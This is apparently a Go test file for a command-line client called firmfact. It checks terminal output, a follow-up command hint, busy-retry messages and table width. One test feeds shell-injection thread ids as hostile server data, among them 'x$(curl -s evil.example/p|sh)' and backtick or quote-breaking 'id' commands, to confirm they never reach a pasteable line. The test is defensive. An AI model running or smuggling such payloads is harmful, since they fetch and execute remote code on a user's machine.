package cmd

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"strings"
	"syscall"
	"testing"
	"unicode/utf8"

	"golang.org/x/sys/unix"
)

// openPTY returns both ends of a new pseudo-terminal: what is written to
// tty can be read from master, as a terminal would show it.
func openPTY(t *testing.T) (master, tty *os.File) {
	t.Helper()
	master, err := os.OpenFile("/dev/ptmx", os.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		t.Skipf("no pseudo-terminals here: %v", err)
	}
	t.Cleanup(func() { master.Close() })
	if err := unix.IoctlSetPointerInt(int(master.Fd()), unix.TIOCSPTLCK, 0); err != nil {
		t.Fatalf("unlock pty: %v", err)
	}
	n, err := unix.IoctlGetUint32(int(master.Fd()), unix.TIOCGPTN)
	if err != nil {
		t.Fatalf("pty number: %v", err)
	}
	tty, err = os.OpenFile(fmt.Sprintf("/dev/pts/%d", n), os.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		t.Fatalf("open pty: %v", err)
	}
	return master, tty
}

// runOnTerminalStderr is one invocation with stdout captured and stderr on
// a terminal, as when a person pipes the answer somewhere; it returns what
// the terminal showed.
func runOnTerminalStderr(t *testing.T, args ...string) (stdout, terminal string) {
	t.Helper()
	master, tty := openPTY(t)
	shown := make(chan string, 1)
	go func() {
		// Reading ends with EIO once the terminal side is closed.
		raw, err := io.ReadAll(master)
		if err != nil && !errors.Is(err, syscall.EIO) {
			t.Errorf("read terminal: %v", err)
		}
		shown <- strings.ReplaceAll(string(raw), "\r\n", "\n")
	}()
	var out bytes.Buffer
	err := NewRootCommand(Build{Version: "test"}, args, IOStreams{Out: &out, Err: tty}).Execute()
	tty.Close()
	if err != nil {
		t.Fatalf("%v: %v", args, err)
	}
	return out.String(), <-shown
}

// On a terminal, a chat answer is followed on stderr by the command that
// asks a follow-up in its thread, with the flags that chose the host and
// workspace, since the thread lives there: ask, whether the question came
// from ask or from chat-with-workspace. The answer itself stays on stdout
// alone.
func TestChatSaysHowToContinueOnATerminal(t *testing.T) {
	isolate(t)
	t.Setenv("NO_COLOR", "1")
	srv := (&mcpServer{result: toolResult(t, readFixture(t, "chat.json"))}).start(t)
	signedInWithTools(t, srv.URL, chatWithWorkspace)
	const thread = "0199a3c2-5b7e-7d41-9e0a-6f2d8c1b4a53"
	want := "\nContinue: firmfact ask --host " + srv.URL + ` --workspace "Acme Bank" --thread ` + thread + ` "..."` + "\n"

	for _, args := range [][]string{
		{"ask", "Hi"},
		{"chat-with-workspace", "--message", "Hi"},
	} {
		stdout, shown := runOnTerminalStderr(t, append([]string{"--host", srv.URL, "--workspace", "Acme Bank"}, args...)...)
		if shown != want {
			t.Errorf("%s: terminal showed %q, want %q", args[0], shown, want)
		}
		if !strings.HasPrefix(stdout, "Your largest vendor is **S&P Global Inc.**") || strings.Contains(stdout, "Continue") {
			t.Errorf("%s: stdout = %q", args[0], stdout)
		}
	}

	_, shown := runOnTerminalStderr(t, "call", "chat_with_workspace", "--host", srv.URL, "--arg", "message=Hi")
	want = "\nContinue: firmfact call chat_with_workspace --host " + srv.URL + " --arg thread_id=" + thread + ` --arg message="..."` + "\n"
	if shown != want {
		t.Errorf("call: terminal showed %q, want %q", shown, want)
	}
}

// A thread id is the server's, and so is a workspace id: one that no
// quoting reads the same in every shell never reaches the command line the
// user is shown to paste, where $(...) or a backtick would run. The
// placeholder takes its place.
func TestContinueLineNeverCarriesAHostileThreadID(t *testing.T) {
	isolate(t)
	t.Setenv("NO_COLOR", "1")
	for _, thread := range []string{"x$(curl -s evil.example/p|sh)", "x`id`", `x\`, `x";id;"`} {
		answer := mustJSON(t, map[string]any{"response": "Hi.", "thread_id": thread})
		srv := (&mcpServer{result: toolResult(t, answer)}).start(t)
		signedInWithTools(t, srv.URL, chatWithWorkspace)

		_, shown := runOnTerminalStderr(t, "--host", srv.URL, "ask", "Hi")
		if want := "\nContinue: firmfact ask --host " + srv.URL + ` --thread <thread-id> "..."` + "\n"; shown != want {
			t.Errorf("thread %q: terminal showed %q, want %q", thread, shown, want)
		}
		_, shown = runOnTerminalStderr(t, "call", "chat_with_workspace", "--host", srv.URL, "--arg", "message=Hi")
		if want := "\nContinue: firmfact call chat_with_workspace --host " + srv.URL + ` --arg thread_id=<thread-id> --arg message="..."` + "\n"; shown != want {
			t.Errorf("thread %q: call showed %q, want %q", thread, shown, want)
		}
	}
}

// On a terminal, a wait for a busy server is said on stderr before it
// starts, so the pause does not look like a hang. It takes the place of a
// live line with an erase sequence: NO_COLOR does not stop those.
func TestBusyWaitIsShownOnATerminal(t *testing.T) {
	isolate(t)
	t.Setenv("NO_COLOR", "1")
	t.Setenv("TERM", "xterm-256color")
	f := &mcpServer{result: vendorsResult, busy: 1}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, shown := runOnTerminalStderr(t, "--host", srv.URL, "vendors", "list")
	if !strings.Contains(shown, "\r\x1b[KServer busy; retrying in 1s...\n") {
		t.Errorf("terminal showed %q, want the wait said", shown)
	}
	if strings.Contains(stdout, "busy") || !strings.Contains(stdout, "Acme") {
		t.Errorf("stdout = %q, want the vendors alone", stdout)
	}
	if n := len(f.calls()); n != 2 {
		t.Errorf("calls = %d, want 2", n)
	}
}

// runOnTerminalStdout is one invocation with stdout on a terminal of the
// given width, as when a person reads a table there; it returns what the
// terminal showed.
func runOnTerminalStdout(t *testing.T, columns int, args ...string) string {
	t.Helper()
	master, tty := openPTY(t)
	if err := unix.IoctlSetWinsize(int(tty.Fd()), unix.TIOCSWINSZ, &unix.Winsize{Row: 24, Col: uint16(columns)}); err != nil {
		t.Fatalf("size the terminal: %v", err)
	}
	shown := make(chan string, 1)
	go func() {
		raw, err := io.ReadAll(master)
		if err != nil && !errors.Is(err, syscall.EIO) {
			t.Errorf("read terminal: %v", err)
		}
		shown <- strings.ReplaceAll(string(raw), "\r\n", "\n")
	}()
	err := NewRootCommand(Build{Version: "test"}, args, IOStreams{Out: tty, Err: io.Discard}).Execute()
	tty.Close()
	if err != nil {
		t.Fatalf("%v: %v", args, err)
	}
	return <-shown
}

// On a terminal a table fits its width, cut with ellipses; a pipe gets it
// whole, and --wide gets every field whole, ids that are UUIDs included.
func TestTableFitsTheTerminal(t *testing.T) {
	isolate(t)
	t.Setenv("NO_COLOR", "1")
	rows := mustJSON(t, []any{
		map[string]any{"name": "Morningstar PitchBook Platform – Enterprise Tier", "id": "118b1b32-b400-4491-ac53-d847ba35a1b9", "userdef_id": "V-1001", "status": "active", "cost": 186317.72, "website": "https://pitchbook.example/enterprise"},
		map[string]any{"name": "Eurex Ultra", "id": "bcce6995-21ff-45d8-a966-210edaf38612", "userdef_id": "V-1002", "status": "active", "cost": 95.62, "website": "https://eurex.example"},
	})
	srv := (&mcpServer{result: toolResult(t, rows)}).start(t)
	signedInWithTools(t, srv.URL, listVendors)

	fitted := runOnTerminalStdout(t, 80, "--host", srv.URL, "vendors", "list")
	for _, line := range strings.Split(strings.TrimSuffix(fitted, "\n"), "\n") {
		if n := utf8.RuneCountInString(line); n > 80 {
			t.Errorf("a line of %d columns on an 80-column terminal: %q", n, line)
		}
	}
	if !strings.Contains(fitted, "…") || !strings.Contains(fitted, "186,317.72") || !strings.Contains(fitted, "WEBSITE") {
		t.Errorf("terminal showed:\n%s", fitted)
	}

	whole := runOnTerminalStdout(t, 80, "--host", srv.URL, "vendors", "list", "--wide")
	piped, _, err := run("test", "--host", srv.URL, "vendors", "list")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(whole, "…") || strings.Contains(piped, "…") || !strings.Contains(whole, "Morningstar PitchBook Platform – Enterprise Tier") ||
		!strings.Contains(whole, "118b1b32-b400-4491-ac53-d847ba35a1b9") || strings.Contains(piped, "118b1b32") ||
		!strings.Contains(piped, "Morningstar PitchBook Platform – Enterprise Tier") {
		t.Errorf("--wide showed:\n%s\npiped:\n%s", whole, piped)
	}
}
